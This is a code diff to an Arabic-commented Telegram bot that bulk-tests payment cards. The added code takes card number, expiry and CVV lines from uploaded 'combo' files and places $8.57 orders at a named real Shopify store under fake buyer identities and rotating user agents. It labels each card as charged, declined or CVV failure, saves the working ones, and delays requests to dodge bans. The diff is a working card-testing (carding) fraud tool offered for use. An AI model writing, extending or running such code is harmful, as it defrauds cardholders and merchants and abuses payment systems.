@@ -716,6 +716,198 @@ class RealPayPalGateway:
         except Exception as e:
             return {'status': 'ERROR', 'message': f'❌ Error: {str(e)}', 'code': 'ERROR'}, None
     
+    def check_card_shopify(self, ccx):
+        """بوابة Shopify - Stripe Gateway"""
+        try:
+            r = requests.Session()
+            user = self.get_random_user_agent()
+            
+            ccx = ccx.strip()
+            n = ccx.split("|")[0].replace(" ", "")
+            mm = ccx.split("|")[1]
+            yy = ccx.split("|")[2]
+            cvc = ccx.split("|")[3].strip()
+            
+            # تحويل السنة للصيغة الكاملة
+            if len(yy) == 2:
+                yy = "20" + yy
+            
+            user_info = self.generate_user_info()
+            
+            # الخطوة 1: إنشاء جلسة البطاقة
+            headers1 = {
+                'authority': 'checkout.pci.shopifyinc.com',
+                'accept': 'application/json',
+                'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+                'content-type': 'application/json',
+                'origin': 'https://checkout.pci.shopifyinc.com',
+                'referer': 'https://checkout.pci.shopifyinc.com/build/682c31f/number-ltr.html?identifier=&locationURL=',
+                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+                'sec-ch-ua-mobile': '?1',
+                'sec-ch-ua-platform': '"Android"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'shopify-identification-signature': 'eyJraWQiOiJ2MSIsImFsZyI6IkhTMjU2In0.eyJjbGllbnRfaWQiOiIyIiwiY2xpZW50X2FjY291bnRfaWQiOiIzNzg3NTA4OTQ1MiIsInVuaXF1ZV9pZCI6ImYxNzEyNTQ5OWJjZTE4MTM5MTcwNjE1NjlkMDBkYWUwIiwiaWF0IjoxNzY5NjE5MjM1fQ.of6PA0N7jdiKl6DL0xv6TlymAu0X80YaGwgmBJazKgk',
+                'user-agent': user,
+            }
+            
+            json_data1 = {
+                'credit_card': {
+                    'number': n,
+                    'month': int(mm),
+                    'year': int(yy),
+                    'verification_value': cvc,
+                    'start_month': None,
+                    'start_year': None,
+                    'issue_number': '',
+                    'name': f"{user_info['first_name']} {user_info['last_name']}",
+                },
+                'payment_session_scope': 'body-pleasure-piercing-online.myshopify.com',
+            }
+            
+            response1 = r.post('https://checkout.pci.shopifyinc.com/sessions', headers=headers1, json=json_data1)
+            
+            if response1.status_code != 200:
+                return {'status': 'ERROR', 'message': '❌ Failed to create session', 'code': 'ERROR'}, user_info
+            
+            session_data = response1.json()
+            session_id = session_data.get('id', '')
+            
+            if not session_id:
+                return {'status': 'ERROR', 'message': '❌ No session ID returned', 'code': 'ERROR'}, user_info
+            
+            # الخطوة 2: تقديم الطلب
+            headers2 = {
+                'authority': 'body-pleasure-piercing-online.myshopify.com',
+                'accept': 'application/json',
+                'accept-language': 'en-AU',
+                'content-type': 'application/json',
+                'origin': 'https://body-pleasure-piercing-online.myshopify.com',
+                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+                'sec-ch-ua-mobile': '?1',
+                'sec-ch-ua-platform': '"Android"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'shopify-checkout-client': 'checkout-web/1.0',
+                'user-agent': user,
+            }
+            
+            params = {
+                'operationName': 'SubmitForCompletion',
+            }
+            
+            json_data2 = {
+                'variables': {
+                    'input': {
+                        'sessionInput': {
+                            'sessionToken': session_id,
+                        },
+                        'payment': {
+                            'totalAmount': {
+                                'any': True,
+                            },
+                            'paymentLines': [
+                                {
+                                    'paymentMethod': {
+                                        'directPaymentMethod': {
+                                            'paymentMethodIdentifier': session_id,
+                                            'sessionId': session_id,
+                                            'billingAddress': {
+                                                'streetAddress': {
+                                                    'address1': 'New York State',
+                                                    'address2': '',
+                                                    'city': 'New York',
+                                                    'countryCode': 'US',
+                                                    'postalCode': '10080',
+                                                    'firstName': user_info['first_name'],
+                                                    'lastName': user_info['last_name'],
+                                                    'zoneCode': 'NY',
+                                                    'phone': '+12702871380',
+                                                },
+                                            },
+                                        },
+                                    },
+                                    'amount': {
+                                        'value': {
+                                            'amount': '8.57',
+                                            'currencyCode': 'USD',
+                                        },
+                                    },
+                                },
+                            ],
+                            'billingAddress': {
+                                'streetAddress': {
+                                    'address1': 'New York State',
+                                    'address2': '',
+                                    'city': 'New York',
+                                    'countryCode': 'US',
+                                    'postalCode': '10080',
+                                    'firstName': user_info['first_name'],
+                                    'lastName': user_info['last_name'],
+                                    'zoneCode': 'NY',
+                                    'phone': '+12702871380',
+                                },
+                            },
+                        },
+                        'buyerIdentity': {
+                            'customer': {
+                                'presentmentCurrency': 'USD',
+                                'countryCode': 'US',
+                            },
+                            'email': user_info['email'],
+                        },
+                    },
+                },
+                'operationName': 'SubmitForCompletion',
+            }
+            
+            response2 = r.post(
+                'https://body-pleasure-piercing-online.myshopify.com/checkouts/internal/graphql/persisted',
+                params=params,
+                headers=headers2,
+                json=json_data2,
+            )
+            
+            return self._parse_shopify_response(response2.text), user_info
+            
+        except Exception as e:
+            return {'status': 'ERROR', 'message': f'❌ Error: {str(e)}', 'code': 'ERROR'}, None
+    
+    def _parse_shopify_response(self, text):
+        """تحليل استجابة Shopify"""
+        text = text.upper()
+        
+        if 'COMPLETED' in text or 'SUCCESS' in text or 'APPROVED' in text:
+            return {'status': 'CHARGED', 'message': '✅ Charged $8.57', 'code': 'APPROVED'}
+        elif 'CARD_DECLINED' in text or 'DECLINED' in text:
+            return {'status': 'DECLINED', 'message': '❌ Card Declined', 'code': 'DECLINED'}
+        elif 'INSUFFICIENT_FUNDS' in text:
+            return {'status': 'INSUFFICIENT_FUNDS', 'message': '❌ Insufficient Funds', 'code': 'DECLINED'}
+        elif 'INVALID_NUMBER' in text or 'INCORRECT_NUMBER' in text:
+            return {'status': 'INVALID_NUMBER', 'message': '❌ Invalid Card Number', 'code': 'DECLINED'}
+        elif 'INVALID_EXPIRY' in text or 'EXPIRED' in text:
+            return {'status': 'EXPIRED_CARD', 'message': '❌ Expired Card', 'code': 'DECLINED'}
+        elif 'INVALID_CVC' in text or 'INCORRECT_CVC' in text or 'CVV' in text:
+            return {'status': 'CVV_FAILURE', 'message': '❌ Invalid CVV', 'code': 'DECLINED'}
+        elif 'FRAUD' in text or 'SUSPECTED_FRAUD' in text:
+            return {'status': 'SUSPECTED_FRAUD', 'message': '❌ Suspected Fraud', 'code': 'DECLINED'}
+        elif 'DO_NOT_HONOR' in text:
+            return {'status': 'DO_NOT_HONOR', 'message': '❌ Do Not Honor', 'code': 'DECLINED'}
+        elif 'LOST' in text or 'STOLEN' in text:
+            return {'status': 'LOST_OR_STOLEN', 'message': '❌ Lost Or Stolen Card', 'code': 'DECLINED'}
+        elif 'PROCESSING_ERROR' in text:
+            return {'status': 'PROCESSING_ERROR', 'message': '❌ Processing Error', 'code': 'DECLINED'}
+        elif 'AUTHENTICATION_REQUIRED' in text or '3D_SECURE' in text:
+            return {'status': '3DS_REQUIRED', 'message': '⚠️ 3D Secure Required', 'code': 'DECLINED'}
+        elif 'RATE_LIMIT' in text:
+            return {'status': 'RATE_LIMIT', 'message': '❌ Rate Limited', 'code': 'ERROR'}
+        elif 'ERROR' in text:
+            return {'status': 'ERROR', 'message': '❌ Gateway Error', 'code': 'ERROR'}
+        else:
+            return {'status': 'UNKNOWN', 'message': '❓ Unknown Response', 'code': 'UNKNOWN'}
+    
     def process_single_card(self, card_line, gateway_type="crisiscafe"):
         """معالجة بطاقة واحدة باستخدام البوابة المحددة"""
         start_time = time.time()
@@ -757,6 +949,8 @@ class RealPayPalGateway:
         # اختيار البوابة
         if gateway_type == "rarediseases":
             result, user_info = self.check_card_rarediseases(card_line)
+        elif gateway_type == "shopify":
+            result, user_info = self.check_card_shopify(card_line)
         else:  # crisiscafe
             result, user_info = self.check_card_crisiscafe(card_line)
         
@@ -879,26 +1073,39 @@ async def format_card_result(card_line, result):
     
     return formatted
 
-async def process_combo_file(file_path, user_id, message, gateway_type="crisiscafe"):
+async def process_combo_file(file_path, user_id, message, gateway_type="crisiscafe", bot=None):
     """معالجة ملف كومبو"""
     valid_count = 0
     total_count = 0
+    stopped = False
     
     try:
         async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
             lines = await f.readlines()
         
+        total_lines = len([l for l in lines if l.strip()])
+        
         for i, line in enumerate(lines, 1):
+            # التحقق من طلب الإيقاف
+            if user_sessions.get(user_id, {}).get('stop_combo', False):
+                stopped = True
+                break
+            
             if not line.strip():
                 continue
             
             total_count += 1
             
-            # تحديث الرسالة كل 3 بطاقات
+            # تحديث الرسالة مع زر الإيقاف
             if i % 3 == 0 or i == len(lines):
-                status_msg = f"⏳ Processing... [{i}/{len(lines)}]\n✅ Valid: {valid_count} | ❌ Invalid: {total_count - valid_count}"
+                keyboard = InlineKeyboardBuilder()
+                keyboard.add(
+                    InlineKeyboardButton(text="⏹️ إيقاف الفحص", callback_data=f"stop_combo:{user_id}")
+                )
+                
+                status_msg = f"⏳ Processing... [{total_count}/{total_lines}]\n✅ Valid: {valid_count} | ❌ Invalid: {total_count - valid_count}\n\n🔴 اضغط الزر لإيقاف الفحص"
                 try:
-                    await message.edit_text(status_msg)
+                    await message.edit_text(status_msg, reply_markup=keyboard.as_markup())
                 except:
                     pass
             
@@ -916,11 +1123,15 @@ async def process_combo_file(file_path, user_id, message, gateway_type="crisisca
             # تأخير بين البطاقات لتجنب الحظر
             await asyncio.sleep(2)
         
-        return valid_count, total_count
+        # إعادة تعيين حالة الإيقاف
+        if user_id in user_sessions:
+            user_sessions[user_id]['stop_combo'] = False
+        
+        return valid_count, total_count, stopped
         
     except Exception as e:
         logger.error(f"Error processing combo file: {e}")
-        return 0, 0
+        return 0, 0, False
 
 # ===========================================
 # معالجات الأوامر
@@ -978,6 +1189,7 @@ async def select_gateway_handler(callback: CallbackQuery):
     keyboard.add(
         InlineKeyboardButton(text="💰 CrisisCafe PayPal $1", callback_data="gateway:crisiscafe"),
         InlineKeyboardButton(text="💰 RareDiseases PayPal $1", callback_data="gateway:rarediseases"),
+        InlineKeyboardButton(text="🛍️ Shopify Stripe $8.57", callback_data="gateway:shopify"),
         InlineKeyboardButton(text="🔙 Back", callback_data="back_main")
     )
     keyboard.adjust(1)
@@ -986,8 +1198,9 @@ async def select_gateway_handler(callback: CallbackQuery):
         "🌐 **Select Gateway**\n\n"
         "Choose the gateway you want to use:\n\n"
         "• **CrisisCafe** - PayPal Commerce $1 Charge\n"
-        "• **RareDiseases** - PayPal Commerce $1 Charge\n\n"
-        "⚠️ Both gateways charge $1 for verification.",
+        "• **RareDiseases** - PayPal Commerce $1 Charge\n"
+        "• **Shopify** - Stripe Gateway $8.57 Charge\n\n"
+        "⚠️ Gateways charge different amounts for verification.",
         reply_markup=keyboard.as_markup(),
         parse_mode=ParseMode.MARKDOWN
     )
@@ -1004,7 +1217,14 @@ async def gateway_selected_handler(callback: CallbackQuery):
         user_sessions[user_id] = {}
     user_sessions[user_id]['gateway'] = gateway_type
     
-    gateway_name = "CrisisCafe" if gateway_type == "crisiscafe" else "RareDiseases"
+    if gateway_type == "crisiscafe":
+        gateway_name = "CrisisCafe"
+    elif gateway_type == "rarediseases":
+        gateway_name = "RareDiseases"
+    elif gateway_type == "shopify":
+        gateway_name = "Shopify"
+    else:
+        gateway_name = "CrisisCafe"
     
     await callback.message.edit_text(
         f"✅ **Gateway Selected:** {gateway_name}\n\n"
@@ -1019,7 +1239,14 @@ async def single_check_handler(callback: CallbackQuery):
     """معالج فحص بطاقة واحدة"""
     user_id = callback.from_user.id
     gateway_type = user_sessions.get(user_id, {}).get('gateway', 'crisiscafe')
-    gateway_name = "CrisisCafe" if gateway_type == "crisiscafe" else "RareDiseases"
+    if gateway_type == "crisiscafe":
+        gateway_name = "CrisisCafe"
+    elif gateway_type == "rarediseases":
+        gateway_name = "RareDiseases"
+    elif gateway_type == "shopify":
+        gateway_name = "Shopify"
+    else:
+        gateway_name = "CrisisCafe"
     
     await callback.message.edit_text(
         f"💳 **Single Card Check**\n\n"
@@ -1090,7 +1317,14 @@ async def combo_check_handler(callback: CallbackQuery):
     """معالج فحص كومبو"""
     user_id = callback.from_user.id
     gateway_type = user_sessions.get(user_id, {}).get('gateway', 'crisiscafe')
-    gateway_name = "CrisisCafe" if gateway_type == "crisiscafe" else "RareDiseases"
+    if gateway_type == "crisiscafe":
+        gateway_name = "CrisisCafe"
+    elif gateway_type == "rarediseases":
+        gateway_name = "RareDiseases"
+    elif gateway_type == "shopify":
+        gateway_name = "Shopify"
+    else:
+        gateway_name = "CrisisCafe"
     
     await callback.message.edit_text(
         f"📁 **Combo File Check**\n\n"
@@ -1172,14 +1406,43 @@ async def process_combo_file_handler(message: Message):
         logger.error(f"Error handling combo file: {e}")
         await message.answer(f"❌ Error processing file: {str(e)}")
 
+@router.callback_query(F.data.startswith("stop_combo:"))
+async def stop_combo_processing(callback: CallbackQuery):
+    """إيقاف معالجة كومبو"""
+    user_id = int(callback.data.split(":")[1])
+    
+    # التحقق من أن المستخدم هو نفسه الذي بدأ الفحص
+    if callback.from_user.id != user_id:
+        await callback.answer("❌ لا يمكنك إيقاف فحص شخص آخر!", show_alert=True)
+        return
+    
+    # تعيين علامة الإيقاف
+    if user_id not in user_sessions:
+        user_sessions[user_id] = {}
+    user_sessions[user_id]['stop_combo'] = True
+    
+    await callback.answer("⏹️ جاري إيقاف الفحص...", show_alert=True)
+
 @router.callback_query(F.data.startswith("start_combo:"))
 async def start_combo_processing(callback: CallbackQuery):
     """بدء معالجة كومبو"""
     file_path = callback.data.split(":")[1]
     user_id = callback.from_user.id
     
+    # إعادة تعيين حالة الإيقاف
+    if user_id not in user_sessions:
+        user_sessions[user_id] = {}
+    user_sessions[user_id]['stop_combo'] = False
+    
     gateway_type = user_sessions.get(user_id, {}).get('gateway', 'crisiscafe')
-    gateway_name = "CrisisCafe" if gateway_type == "crisiscafe" else "RareDiseases"
+    if gateway_type == "crisiscafe":
+        gateway_name = "CrisisCafe"
+    elif gateway_type == "rarediseases":
+        gateway_name = "RareDiseases"
+    elif gateway_type == "shopify":
+        gateway_name = "Shopify"
+    else:
+        gateway_name = "CrisisCafe"
     
     # رسالة البداية
     processing_msg = await callback.message.edit_text(
@@ -1197,15 +1460,22 @@ async def start_combo_processing(callback: CallbackQuery):
         start_time = time.time()
         
         # معالجة الملف
-        valid_count, total_count = await process_combo_file(
+        valid_count, total_count, stopped = await process_combo_file(
             file_path, user_id, processing_msg, gateway_type
         )
         
         elapsed_time = round(time.time() - start_time, 1)
         
         # النتيجة النهائية
+        if stopped:
+            status_title = "⏹️ **Combo Processing Stopped!**"
+            status_note = "🔴 **تم إيقاف الفحص بواسطة المستخدم**"
+        else:
+            status_title = "✅ **Combo Processing Complete!**"
+            status_note = "🎉 **Done!** You can download the results file or check another combo."
+        
         result_text = f"""
-✅ **Combo Processing Complete!**
+{status_title}
 
 📊 **Results:**
 • 📄 File: Processed
@@ -1218,7 +1488,7 @@ async def start_combo_processing(callback: CallbackQuery):
 
 💾 **Valid cards have been saved to:** `{VALID_CARDS_FILE}`
 
-🎉 **Done!** You can download the results file or check another combo.
+{status_note}
 """
         
         keyboard = InlineKeyboardBuilder()
